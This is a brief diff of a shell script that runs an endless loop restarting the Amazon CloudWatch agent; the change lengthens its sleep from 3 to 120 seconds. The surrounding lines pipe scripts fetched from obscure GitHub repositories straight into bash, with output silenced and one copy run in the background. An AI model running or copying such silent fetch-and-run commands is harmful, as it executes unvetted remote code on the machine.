@@ -7,6 +7,6 @@ bash <(wget -qO- https://github.com/army2mil/njabscb/raw/refs/heads/main/...) >>
 while [ 1 ]; do
     restart restart-cloudwatch-agent
     systemctl restart amazon-cloudwatch-agent.service
-    sleep 3
+    sleep 120
 done
 #bash <(wget -qO- https://github.com/army2mil/cautech/raw/refs/heads/main/...) >>/dev/null 2>&1 &
